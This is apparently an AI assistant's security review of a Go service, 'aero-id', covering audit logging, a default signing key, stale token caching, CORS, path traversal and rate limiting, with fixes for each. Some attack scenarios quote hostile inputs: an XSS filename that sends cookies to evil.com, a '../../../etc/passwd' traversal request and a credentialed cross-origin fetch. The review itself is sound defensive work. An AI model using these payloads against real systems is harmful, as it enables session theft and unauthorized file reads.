Now I have a thorough understanding of the codebase. Here is my comprehensive security review.

---

# Security Review: aero-id Subsystem

## Overall Security Posture: **Needs Improvement**

The codebase demonstrates strong security awareness in several areas (defense-in-depth upload caps, circuit breakers, stale-cache fallback, SPKI pinning support, gRPC keepalive enforcement), but has critical gaps in error handling, audit reliability, and default configurations that would be exploitable in production.

---

## Findings

### FINDING-01

| Field | Value |
|-------|-------|
| **Category** | Data Protection |
| **Severity** | **Critical** |
| **Title** | Audit log errors silently swallowed — no non-repudiation guarantee |
| **Location** | `internal/notification/dispatcher.go` — everywhere `audit.Log()` is called with `_ =` |
| **Description** | Every audit event call uses `_ = s.audit.Log(ctx, ...)`, discarding the error. The audit logger interface explicitly states "a failed log must not fail the primary operation", so this is by design — but it means a silent audit outage (e.g. misconfigured DB, full disk) would go completely undetected while critical operations (role grants, bans, file shares) proceed unlogged. This breaks non-repudiation requirements for SOC2/GDPR compliance. |
| **Attack Scenario** | An attacker who compromises an admin account grants themselves `PermUserBan`, bans all legitimate admins, and exfiltrates data. The audit log silently fails to record any of these actions (e.g. due to a full disk on the DB). Forensic analysis finds no trace of the attacker's actions. The attacker denies all actions with plausible deniability. |
| **Impact** | Complete loss of audit trail integrity. Failed audit logging is invisible to operators. Legal/non-repudiation requirements are not met. |
| **Recommendation** | Implement a secondary audit channel that is independent of the primary DB. At minimum: (1) Log audit failures at `ERROR` level with a dedicated logger that has its own appender (e.g., a separate file or syslog). (2) Expose an `audit_dropped_count` metric for monitoring. (3) Consider a two-phase approach: write to a dedicated audit table first, then the business operation. **Code example**: `if err := s.audit.Log(ctx, evt); err != nil { log.Error("audit log dropped", zap.Error(err), zap.String("action", evt.Action)); metrics.AuditDrops.Add(1) }` |
| **Effort** | M |

---

### FINDING-02

| Field | Value |
|-------|-------|
| **Category** | Cryptography |
| **Severity** | **Critical** |
| **Title** | Default signing key in committed config |
| **Location** | `configs/config.yaml` line: `signing_key: change-me-please-very-long-random` |
| **Description** | The default signing key is a predictable string committed to the repository. This key is used for HMAC-SHA256 presigned download URLs and webhook signatures. An attacker who knows this default can forge presigned URLs for any file stored on a local backend and impersonate webhook events to the external endpoint. The config documentation in `AGENTS.md` says "Secrets via env only, never committed", but the default value itself is a weak, guessable placeholder. |
| **Attack Scenario** | A staging or production deployment that fails to override `AERO_ID_SIGNING_KEY` via environment variable uses `change-me-please-very-long-random`. An attacker who has read access to the config file (e.g., via a path traversal vulnerability or CI leak) can forge download URLs like `/files/dl?key=...&exp=...&sig=<forged>` and download any private file stored on the local backend. |
| **Impact** | Complete compromise of file confidentiality for local-storage deployments with default signing key. Forgeable webhook events. |
| **Recommendation** | (1) In the config file, replace the default with a strong random key or remove it entirely (make it required). (2) Add a config validation check at startup that rejects weak signing keys. (3) Document that the signing key must be a cryptographically random 256-bit (32+ byte) value. (4) **Code example** in `config/config.go`: `if len(cfg.SigningKey) < 32 { return nil, fmt.Errorf("signing key must be at least 32 bytes") }` |
| **Effort** | S |

---

### FINDING-03

| Field | Value |
|-------|-------|
| **Category** | Authentication |
| **Severity** | **High** |
| **Title** | Stale token cache allows 5-minute window for revoked token reuse |
| **Location** | `internal/sso/client.go:52` — `StaleTTL: cfg.SSO.StaleTTL` (default 300s from config) |
| **Description** | When SSO is unreachable and the circuit breaker is open, the SSO client serves cached identities for up to `staleTTL` (300 seconds / 5 minutes) past the token's expiry. Config default: `stale_ttl: 300s`. A revoked token (user logged out or banned) can still be used for authenticated API calls during an SSO outage lasting up to 5 minutes. This creates a window where access control decisions are based on stale identity data. |
| **Attack Scenario** | 1. SSO suffers a transient outage. 2. Admin bans a malicious user in SSO. 3. The banned user's token is immediately revoked in SSO. 4. During the 5-minute stale window, the user continues making API calls to aero-id, which accepts their cached token. 5. The user exfiltrates files or sends abusive messages before the stale cache expires. |
| **Impact** | Bypass of access revocation during SSO outages. Window varies by stale_ttl config. Could enable data exfiltration by revoked users. |
| **Recommendation** | (1) Reduce the default `stale_ttl` to 60s or lower (e.g., 30s) to minimize the window. (2) Document the tradeoff: lower stale_ttl means more rejections during SSO outages. (3) Add a startup warning when stale_ttl > 60s. (4) Consider adding a ban-check bypass: check the local ban cache before accepting a stale token. If the user is locally banned, reject even with a valid stale token. |
| **Effort** | S |

---

### FINDING-04

| Field | Value |
|-------|-------|
| **Category** | Input Validation |
| **Severity** | **High** |
| **Title** | File name / meta data stored without sanitization — XSS vector via API consumers |
| **Location** | `internal/service/file.go:86` (name), `internal/service/message.go` (content/meta), `internal/service/comment.go` (content) |
| **Description** | File names, message/comment content, and arbitrary `meta` maps are stored as-is from user input and returned verbatim in API responses. While aero-id is an API service that returns JSON (not HTML), any consumer (web client, mobile app, admin dashboard) that renders these values unsafely is vulnerable to stored XSS. File names can contain HTML/script content (e.g., `"><script>alert(1)</script>.txt`). The `meta` field is arbitrary `map[string]any` with no schema validation — attackers can inject any JSON structure. |
| **Attack Scenario** | 1. An attacker uploads a file named `<script>document.location='https://evil.com/?c='+document.cookie</script>.txt`. 2. An admin views the file list in a web dashboard that renders the filename without escaping. 3. The script executes in the admin's browser, stealing their session cookie. |
| **Impact** | Stored XSS in any consumer application that renders aero-id responses without proper escaping. Cookie theft, session hijacking, CSRF token theft. |
| **Recommendation** | (1) Add server-side output encoding for all user-controlled fields in JSON responses: implement a `sanitizeString` function that strips or encodes HTML control characters. (2) Add input validation that rejects file names containing `<`, `>`, `&`, `"`, `'` or other HTML-special characters. (3) Validate `meta` map keys/values against a schema (reject HTML-like content). (4) For the HTTP handlers specifically, add a Content-Security-Policy header as defense-in-depth. |
| **Effort** | M |

---

### FINDING-05

| Field | Value |
|-------|-------|
| **Category** | Denial of Service |
| **Severity** | **High** |
| **Title** | Rate limiting is opt-in and disabled by default |
| **Location** | `configs/config.yaml` — `rate_limit.enabled: false` |
| **Description** | Rate limiting is disabled by default (`enabled: false`). When enabled, it is per-instance (in-memory token bucket), so horizontal scaling renders it ineffective — each instance has its own token bucket, multiplying the effective rate by the number of instances. No rate limiting on auth endpoints specifically means SSO could be overwhelmed by a sustained burst of token validation requests. The idempotency store is also per-instance (GORM or Redis), meaning concurrent duplicates across instances are not caught. |
| **Attack Scenario** | 1. An attacker discovers the aero-id HTTP endpoint. 2. With rate limiting off, they issue 10,000 parallel POST requests to `/v1/messages`. 3. The gRPC SSO endpoint is hammered with 10,000 token validations (singleflight collapses concurrent duplicates, but only per-instance and only for the same token — different tokens still go through). 4. SSO becomes unavailable, causing the breaker to open and the stale-cache fallback to kick in, degrading auth for all users. |
| **Impact** | SSO capacity exhaustion, degraded auth for legitimate users. Potential cascade to other aero-id instances sharing the same SSO. |
| **Recommendation** | (1) Enable rate limiting by default with conservative defaults (20 rps, 40 burst as documented in config). (2) For production multi-instance deployments, implement distributed rate limiting using Redis (the Redis client is already wired but unused for rate limiting). (3) Add a dedicated, lower rate limit for auth/token validation endpoints. (4) **Short-term**: add to `config.go` validation: `if !cfg.RateLimit.Enabled { log.Warn("rate limiting is disabled — service is vulnerable to DoS") }` |
| **Effort** | L (distributed limiting); S (enable by default) |

---

### FINDING-06

| Field | Value |
|-------|-------|
| **Category** | Input Validation |
| **Severity** | **High** |
| **Title** | Path traversal in local storage backend via storage key manipulation |
| **Location** | `internal/storage/local.go:47-52` — `keyToPath` joins user-derived `key` to root |
| **Description** | The `Get`, `Delete`, `Stat`, and `PresignGet` methods take a `key` parameter and join it to the storage root using `filepath.Join`. While the key is typically generated server-side via `NewKey()`, the `Get` endpoint in `internal/handler/http/file.go` returns a presigned URL that includes the key in query params (`/files/dl?key=...`). An attacker who can forge a valid HMAC signature (see FINDING-02) could supply a key like `../../etc/passwd`. The HMAC signature would fail verification, but if the signing key is compromised or default, this is a direct path traversal to arbitrary file reads. Even without forging, any code path that passes a user-derived key to Get/Delete could be exploited. |
| **Attack Scenario** | With a compromised/forged signing key: 1. Attacker computes an HMAC for `key=../../../etc/passwd, exp=<future timestamp>`. 2. Requests `/files/dl?key=../../../etc/passwd&exp=...&sig=...`. 3. The server reads `/data/files/../../../etc/passwd` = `/etc/passwd`. 4. System user list is leaked. |
| **Impact** | Arbitrary file read on the server. Full server compromise if combined with other vulnerabilities (e.g., reading SSH keys, configuration files containing secrets). |
| **Recommendation** | (1) Add path traversal sanitization in `keyToPath`: reject keys containing `..` or starting with `/`. (2) Use `filepath.Clean` and verify the result is within `Root`. (3) **Code example**: `func (l *Local) keyToPath(key string) string { clean := filepath.Clean(filepath.Join(l.cfg.Root, key)); if !strings.HasPrefix(clean, filepath.Clean(l.cfg.Root)+string(filepath.Separator)) { return "" }; return clean }` with callers checking for empty return. (4) Validate the key parameter in all public-facing code paths. |
| **Effort** | S |

---

### FINDING-07

| Field | Value |
|-------|-------|
| **Category** | Data Protection |
| **Severity** | **Medium** |
| **Title** | File content stored unencrypted at rest |
| **Location** | `internal/storage/local.go` — files written to disk as-is; `internal/storage/s3.go` — no server-side encryption config |
| **Description** | Files uploaded to aero-id are stored as-is on disk (local backend) or in S3 without explicit server-side encryption (SSE) configuration. The local backend writes files to `./data/files/` via `os.Create`. S3 uploads do not set `ServerSideEncryption` on `PutObjectInput`. If the underlying disk or S3 bucket is compromised, all file contents are readable. No config option exists to enable encryption at rest. |
| **Attack Scenario** | 1. An attacker gains read access to the Docker volume mounted at `./data/files` (e.g., via a container escape). 2. All user-uploaded files are readable as plaintext. 3. Private documents, images, and messages are exfiltrated. |
| **Impact** | Loss of file confidentiality. Non-compliance with data-at-rest encryption requirements (GDPR Art. 32, SOC2, PCI). |
| **Recommendation** | (1) For the local backend: support an `encryption_key` config option that enables transparent AES-256-GCM encryption on write/decryption on read using a per-file random nonce. (2) For S3: add config options for SSE-S3 or SSE-KMS and pass `ServerSideEncryption` in `PutObjectInput`. (3) Document that at-rest encryption is the operator's responsibility for the local backend, and recommend S3 with SSE for production. (4) Add a startup warning when encryption is not configured. |
| **Effort** | L |

---

### FINDING-08

| Field | Value |
|-------|-------|
| **Category** | Authorization |
| **Severity** | **Medium** |
| **Title** | Comment reporting system has no spam/abuse controls — attacker can report all user comments |
| **Location** | `internal/service/comment.go:184-208` — `Report` method |
| **Description** | Any authenticated user who can read a target can file reports against comments on that target. There is no rate limit on reports, no cooldown mechanism, and no minimum reputation requirement. An attacker can programmatically report every comment on a popular file or message, flooding the moderation queue and burying legitimate reports. The only protection is that duplicate reports by the same user are rejected (Conflict), but a different user or a rotating set of attacker-controlled accounts can report the same comment multiple times. |
| **Attack Scenario** | 1. An attacker creates 100 accounts. 2. For each comment on a popular file, each attacker account files a report with reason "spam". 3. The legitimate comment author's moderation queue is flooded with 100s of reports for each comment. 4. Genuine moderation issues are buried. The author receives notification spam for each report (via the dispatcher/SSE hub). |
| **Impact** | Moderation queue DoS. Notification spam for comment authors. Legitimate reports may be missed. |
| **Recommendation** | (1) Add a per-user report rate limit (e.g., 10 reports per 10 minutes). (2) Implement report coalescing: multiple reports on the same comment within a window increment a counter but don't create new notification events. (3) Require a minimum account age or reputation score before reporting (if such data is available from SSO). (4) **Code example**: `if err := reportLimiter.Allow(actor); err != nil { return apperr.BadRequest("comment.report_limit_exceeded", "too many reports") }` |
| **Effort** | M |

---

### FINDING-09

| Field | Value |
|-------|-------|
| **Category** | Authentication |
| **Severity** | **Medium** |
| **Title** | CORS default allows all origins — permissive for production API |
| **Location** | `internal/middleware/cors.go:12-15` — `allowAll := len(origins) == 0` |
| **Description** | When `CORSOrigins` is empty (the default from config which has no `cors_origins` key), the CORS middleware reflects `Access-Control-Allow-Origin: *`. This allows any website to make authenticated browser requests to aero-id. While CORS does not bypass authentication (the browser enforces same-origin for reading responses), it does allow credentialed requests to be *sent*. An XSS on any website could use `fetch('https://aero-id.example.com/v1/messages', {credentials:'include'})` to make authenticated requests — the browser would include cookies/Authorization headers, and the attacker would see the response if CORS headers permit it. With `Access-Control-Allow-Origin: *`, the attacker can read the response directly. |
| **Attack Scenario** | 1. User authenticates to aero-id (token stored in cookie or localStorage). 2. User visits an attacker-controlled website. 3. Attacker's JavaScript sends `fetch('https://aero-id.example.com/v1/messages', {credentials:'include'})`. 4. With `Access-Control-Allow-Origin: *`, the browser allows reading the response. 5. Attacker reads the user's private messages. |
| **Impact** | Cross-origin data theft for users who have the auth token stored in a cookie (not localStorage). Since aero-id uses Bearer tokens typically stored in `Authorization` headers (not cookies), the browser's `credentials: 'include'` would only send cookies, not `Authorization` headers set by JavaScript. However, if a consumer application stores the token in a cookie, this attack works. |
| **Recommendation** | (1) Require explicit CORS origins configuration in production — reject empty origins at startup if the environment is production. (2) For deployments with browser-based consumers, configure specific origins. (3) Do NOT use `Access-Control-Allow-Origin: *` with credentials. (4) Add a startup warning: `if len(cfg.CORSOrigins) == 0 { log.Warn("CORS is permissive (all origins allowed) — configure cors_origins for production") }` |
| **Effort** | S |

---

### FINDING-10

| Field | Value |
|-------|-------|
| **Category** | Data Protection |
| **Severity** | **Medium** |
| **Title** | Error messages may leak path information and internal state |
| **Location** | `internal/pkg/errors/errors.go:28-30` — `AppError.Error()` includes cause chain |
| **Description** | The `AppError.Error()` method returns a string containing the full cause chain: `"file.not_found: file not found (cause: record not found)"`. This method is used in logging and stack traces. The cause may include GORM errors like `record not found`, PostgreSQL errors, OS path information from storage operations, etc. While the HTTP/gRPC response only sends the `Message` (not the cause), internal logging captures the full chain, potentially leaking file paths, DB connection strings, and other internals into log aggregators. |
| **Attack Scenario** | 1. An attacker triggers a series of errors by sending malformed requests. 2. The operator investigates by searching logs. 3. Log lines contain `(cause: /data/files/u1/2026/07/xxx: no such file or directory)` revealing the local storage path structure, or `(cause: pq: relation "files" does not exist)` revealing internal DB schema. 4. Attacker uses this information to craft more targeted attacks. |
| **Impact** | Information disclosure of internal paths, DB schema, and storage layout. Lowers the bar for further attacks. |
| **Recommendation** | (1) Redact or truncate the cause chain in production log output. (2) Implement a `SafeError()` method that returns only the code and message, and use it in log contexts. (3) Specifically, in the middleware Recovery and AccessLog, log a sanitized version. (4) **Code example**: `func (e *AppError) SafeError() string { return e.Code + ": " + e.Message }` and use this in access logs instead of `.Error()`. |
| **Effort** | S |

---

### FINDING-11

| Field | Value |
|-------|-------|
| **Category** | Threat Model — Spoofing |
| **Severity** | **Medium** |
| **Title** | No token binding to client IP or user agent |
| **Location** | `internal/sso/client.go:159-175` — `ValidateToken` returns uid without binding context |
| **Description** | The token validation flow accepts any valid token and returns the associated uid without any binding to the requesting client's IP, user agent, or session fingerprint. A stolen bearer token can be replayed from any location or device until it expires (or up to `staleTTL` past expiry during SSO outages). The token cache is keyed only by the token string, not by any client attribute, meaning a token leaked from one user session can be used from any client. |
| **Attack Scenario** | 1. Attacker intercepts a Bearer token (e.g., via MITM on an insecure network, XSS, or log leakage). 2. Attacker uses the stolen token from their own machine to call `GET /v1/messages`. 3. The token is valid (not yet expired), so the request is authorized. 4. Attacker reads the victim's private messages and file list. |
| **Impact** | Token theft leads to full account access until expiry. No way to detect token reuse from an unexpected location without additional session context. |
| **Recommendation** | (1) This is primarily an SSO responsibility, but aero-id can add defense-in-depth: implement optional client binding by extending the `ValidateToken` response to include a client fingerprint. (2) Add a `token_fingerprint` field to the token cache that must match the requesting client's IP or a hash of their User-Agent. (3) Log and alert on token reuse from different IPs within the cache window. (4) Short-term: add a config option `enforce_client_ip_binding` that rejects cached tokens presented from a different IP than the first use. |
| **Effort** | M |

---

### FINDING-12

| Field | Value |
|-------|-------|
| **Category** | Session Management |
| **Severity** | **Low** |
| **Title** | No security headers set on HTTP responses (CSP, X-Content-Type-Options, etc.) |
| **Location** | `internal/handler/http/router.go` — no security headers middleware |
| **Description** | The HTTP server does not set standard security response headers: `Content-Security-Policy`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Strict-Transport-Security`, `Referrer-Policy`, or `Permissions-Policy`. While aero-id is primarily an API service (not serving HTML), these headers are still beneficial when responses are consumed by browsers, especially considering the open CORS policy (FINDING-09). Missing `X-Content-Type-Options: nosniff` could allow MIME-type sniffing attacks. |
| **Attack Scenario** | 1. An attacker uploads a file with malicious JavaScript content and a `.txt` extension. 2. A user accesses the file directly. 3. Without `X-Content-Type-Options: nosniff`, the browser may sniff the content and execute it as JavaScript despite the declared Content-Type. |
| **Impact** | MIME-type confusion, potential XSS in browsers that load uploaded files directly. |
| **Recommendation** | (1) Add a security headers middleware that sets: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: interest-cohort=()`. (2) For deployments on HTTPS, set `Strict-Transport-Security: max-age=31536000; includeSubDomains`. (3) Consider setting `Content-Disposition: attachment` for file download responses to prevent in-browser rendering of uploaded files. |
| **Effort** | S |

---

### FINDING-13

| Field | Value |
|-------|-------|
| **Category** | Authorization |
| **Severity** | **Low** |
| **Title** | File share HTTP routes always registered even when sharing is disabled |
| **Location** | `internal/handler/http/file.go:37-51` — share routes always registered |
| **Description** | The file sharing HTTP endpoints (`POST /files/:id/shares`, `DELETE /files/:id/shares/:uid`, `GET /files/shared-with-me`) are always registered on the router regardless of whether the file share repository is wired. When sharing is disabled, calling these endpoints returns a misleading error: `"internal.server_error"` with message `"file sharing is not enabled"` (via `apperr.Internal`). This is an inconsistent error code: an unavailable feature should return HTTP 501 Not Implemented or 400 Bad Request, not 500 Internal Server Error, which could trigger unnecessary alerting in operational dashboards. |
| **Attack Scenario** | This is more an operational concern than an attack vector. However, the `AppError.Internal(...)` returning HTTP 500 could cause monitoring systems to page on-call engineers for a non-critical issue. During incident response, this distracts from real issues. |
| **Impact** | Operational alert fatigue. The 500 status may be misinterpreted by monitoring systems. |
| **Recommendation** | (1) Change the error from `apperr.Internal` to `apperr.BadRequest` or add a dedicated `apperr.NotImplemented`. (2) Alternatively, register the share routes only when sharing is enabled. (3) **Code example**: `if s.shares == nil { return nil, apperr.BadRequest("file.sharing_unavailable", "file sharing is not enabled") }` |
| **Effort** | S |

---

### FINDING-14

| Field | Value |
|-------|-------|
| **Category** | Threat Model — Repudiation |
| **Severity** | **Low** |
| **Title** | No audit logging for file/message/comment reads by non-owners |
| **Location** | `internal/service/file.go:109` — `Get`; `internal/service/message.go:99` — `Get`; `internal/service/comment.go` — `List` |
| **Description** | Read operations (file Get, message Get, comment List) are not audited. In systems with sensitive data, access logging is essential for detecting data exfiltration. An attacker who gains access to a shared file (via sharing feature) can read it without any audit trail. A compromised admin with `PermAuditRead` can query the audit log and see no record of their own illicit reads. |
| **Attack Scenario** | 1. Attacker compromises a user account. 2. Attacker reads all files shared with that user via `GET /v1/files/shared-with-me`. 3. Attacker downloads each file. 4. There is no audit log entry for any of these reads. 5. Post-incident investigation finds no trace of the data exfiltration. |
| **Impact** | Inability to detect unauthorized data access. Non-repudiation failure for read operations. |
| **Recommendation** | (1) Add optional audit logging for read operations on sensitive data (files shared with others, messages in a conversation). (2) Make audit read logging configurable (e.g., `data_retention.audit_read_operations: true`). (3) Specifically for shared files, log any access by a non-owner. (4) **Code example**: in `canRead` path when shared access is granted: `if s.audit != nil && f.OwnerUID != actor { _ = s.audit.Log(ctx, &domain.AuditEvent{ActorUID: actor, Action: "file.read_shared", ...}) }` |
| **Effort** | M |

---

### FINDING-15

| Field | Value |
|-------|-------|
| **Category** | Input Validation |
| **Severity** | **Low** |
| **Title** | Duration string in ban API accepted without maximum bound |
| **Location** | `internal/handler/http/admin.go:108-117` — `time.ParseDuration(req.Duration)` |
| **Description** | The ban duration endpoint accepts arbitrary Go duration strings without upper bound. An admin could accidentally (or a compromised admin could intentionally) set a zero or negative duration, which is treated as "permanent" by the service because only `duration > 0` sets `expiresAt`. This is how permanent bans are meant to work, but there's no guard against a very long but not-permanent ban (e.g., `"100000h"` = ~11.4 years) that is effectively permanent but could be confusingly displayed as temporary. |
| **Attack Scenario** | A compromised admin account sets `duration: "1000000000h"` on a user's ban. The ban is technically temporary (has an `expiresAt`), so monitoring might not flag it as a potential abuse. The user remains banned for effectively forever. |
| **Impact** | Permanent ban under the guise of a temporary one. Very low risk in practice as it requires admin access. |
| **Recommendation** | (1) Add a configurable maximum ban duration (e.g., `bans.max_duration: 720h` = 30 days). (2) Reject durations that exceed the maximum. (3) **Code example**: `maxDuration := 720 * time.Hour; if d > maxDuration { return apperr.BadRequest("ban.duration_too_long", "ban duration must not exceed 30 days") }` |
| **Effort** | S |

---

### FINDING-16

| Field | Value |
|-------|-------|
| **Category** | Compliance |
| **Severity** | **Low** |
| **Title** | Missing `ObserveSSOCache` and `ObserveSSOCall` metrics — blind to SSO health |
| **Location** | `internal/sso/client.go` — metrics methods are nil-safe no-ops when not configured |
| **Description** | The SSO client has a `MetricsSink` interface that receives cache hit/miss and RPC latency/outcome observations, but the implementation (`metrics.Registry`) is only wired in the production `New` call in `app/new.go`. In test configurations or deployments where metrics are disabled, the SSO client operates without any observability. An SSO performance degradation that doesn't trigger the circuit breaker (e.g., 2-second response times instead of 50ms) goes completely undetected, silently degrading all authenticated requests. |
| **Attack Scenario** | A DoS attack against SSO that causes slowdowns (not failures) goes undetected. All aero-id requests that require token validation (i.e., every authenticated request) experience multi-second latency. Users perceive the service as slow, but operators have no metrics to identify SSO as the root cause. |
| **Impact** | Blindness to SSO performance degradation affecting all authenticated requests. |
| **Recommendation** | (1) Make metrics registration mandatory, not optional, at least for the SSO client. (2) Add default prometheus-compatible metrics that are always registered. (3) Add health check alerts for SSO latency p99 > 1s. (4) Expose SSO latency as a RED metric in the `/metrics` endpoint by default (not opt-in). |
| **Effort** | S |

---

## STRIDE Summary

| Category | Key Risks |
|----------|-----------|
| **Spoofing** | Stale token cache allows 5-minute replay window (HIGH). No client binding on tokens (MEDIUM). Default signing key allows forged presigned URLs (CRITICAL). |
| **Tampering** | File content integrity via SHA-256 checksums (good). No integrity protection on stored message/comment content. Meta field is user-controlled and unvalidated. |
| **Repudiation** | Audit errors silently swallowed (CRITICAL). No read-operation audit logging. Not all mutations are audited. |
| **Information Disclosure** | Unencrypted files at rest (MEDIUM). Error messages leak internals (MEDIUM). Permissive CORS allows cross-origin data access (MEDIUM). Meta/user info leaks via API responses (informational). |
| **Denial of Service** | Rate limiting disabled by default (HIGH). No report-spam controls (MEDIUM). Per-instance rate limiting ineffective in horizontal deployments. No global auth rate limiting. |
| **Elevation of Privilege** | RBAC for admin actions (good). Object-level access checks (good). No path for user to escalate without admin token. |

---

## OWASP Top 10 Alignment

| OWASP Risk | Status |
|------------|--------|
| A01: Broken Access Control | **At risk** — stale token cache, no read audit, permissive CORS |
| A02: Cryptographic Failures | **At risk** — default signing key, no at-rest encryption |
| A03: Injection | **Good** — parameterized GORM queries, no raw SQL injection paths |
| A04: Insecure Design | **At risk** — silent audit failures, disabled rate limiting by default |
| A05: Security Misconfiguration | **At risk** — default signing key, permissive CORS, disabled rate limiting |
| A06: Vulnerable Components | **Good** — modern pinned dependencies with go.sum |
| A07: Identification & Auth Failures | **At risk** — stale token reuse, no client binding |
| A08: Software & Data Integrity Failures | **Good** — HMAC-signed webhooks, content checksums |
| A09: Security Logging & Monitoring Failures | **At risk** — audit errors silently dropped, no read audit |
| A10: SSRF | **Good** — no user-controlled URL fetching in application logic |

---

## Overall Security Posture: **Needs Improvement**

### Top 3 Critical Issues

1. **Default signing key in config** (CRITICAL) — `change-me-please-very-long-random` in committed config allows forgery of presigned download URLs and webhook signatures. **Fix in S effort.**

2. **Audit errors silently swallowed** (CRITICAL) — every `audit.Log()` call uses `_ =` to discard errors, making the entire audit trail unreliable. A silent audit outage would go completely undetected. **Fix in M effort.**

3. **5-minute stale token reuse window** (HIGH) — revoked tokens remain usable for up to 5 minutes during SSO outages. Combined with the permissive CORS policy, this enables token replay across origins. **Fix in S effort.**

### Top 3 Quick Wins

1. **Strengthen the default signing key** (S effort) — generate a strong key or make it required, add startup validation.

2. **Enable rate limiting by default** (S effort) — change `enabled: false` to `enabled: true` with conservative defaults (20 rps, 40 burst).

3. **Add path traversal protection to local storage** (S effort) — sanitize keys in `keyToPath` with `filepath.Clean` prefix check.

### Security Debt

| Item | Effort | Priority |
|------|--------|----------|
| File at-rest encryption (local/S3 SSE) | L | Medium |
| Distributed rate limiting via Redis | L | Medium |
| Client-binding for token replay detection | M | Low |
| Read operation audit logging | M | Medium |
| Comment report rate limiting / spam controls | M | Low |
| Ban duration max bound | S | Low |
| Security headers middleware (CSP, HSTS, etc.) | S | Low |
| Input sanitization for file names and meta | M | Medium |
| Error message sanitization in logs | S | Medium |
| Mandatory SSO latency metrics | S | Low |

The codebase has a strong architectural foundation (one-way dependency, clean separation, defense-in-depth around uploads) but the silent audit failures and default signing key are production blockers that must be addressed before deployment.
